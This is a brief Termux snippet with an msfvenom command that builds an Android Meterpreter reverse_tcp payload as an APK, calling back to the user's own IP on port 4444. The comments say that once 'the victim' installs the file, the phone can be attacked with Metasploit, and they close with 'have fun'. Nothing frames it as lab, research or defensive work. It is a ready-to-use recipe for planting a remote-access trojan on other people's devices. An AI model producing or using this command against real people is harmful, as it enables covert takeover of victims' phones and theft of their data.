# code for making pay load in termux
msfvenom -p android/meterpreter/reverse_tcp LHOST=your ipadress LPORT=4444 R > /sdcard/payload.apk
#use this to make payload 
#if the victim install in you can do metasploit attack to his android
#have fun
